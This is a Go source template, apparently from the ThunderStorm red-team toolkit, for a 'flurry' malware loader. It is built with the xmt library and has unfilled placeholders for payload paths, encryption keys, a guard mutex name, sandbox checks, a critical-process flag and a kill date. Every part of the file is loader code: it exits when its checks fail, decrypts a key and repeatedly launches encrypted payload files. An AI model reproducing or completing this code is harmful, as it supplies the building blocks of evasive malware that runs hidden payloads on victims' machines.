// Copyright (C) 2020 - 2024 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import (
	"os"
	"time"

	"github.com/iDigitalFlame/ThunderStorm/flurry"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/man"
)

var z = [...]string{
	$paths
}

var g = [...]byte{
	$guard
}
var k = [...]byte{
	$key
}
var x = [...]byte{
	$files_key
}

func main() {
	// NOTE(dij): Only ran if non-CGO or CGO main is called.
	if $checks {
		device.GoExit()
		return
	}
	// NOTE(dij): "os.Args" Will only work if non-CGO, GO-CGO cannot access argv.
	if len(os.Args) > 2 {
		flurry.Loop(
			time.Second*time.Duration($period), $critical, $killdate,
			man.LinkerFromName(`$event`), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
		)
	} else {
		// BUG(dij): COM DLLs seem to crash?
		//           I think it has to do with MS's stupid threading model.
		//           A workaround for now is to disable critical on non-loop
		//           DLLs and EXEs (since they die anyway).
		flurry.Start(
			false, $killdate, man.LinkerFromName(`$event`), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
		)
	}
}

func secondary() {
	// NOTE(dij): Reserved for CGO secondary functions.
	if $checks {
		device.GoExit()
		return
	}
	flurry.Loop(
		time.Second*time.Duration($period), $critical, $killdate,
		man.LinkerFromName(`$event`), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
	)
}
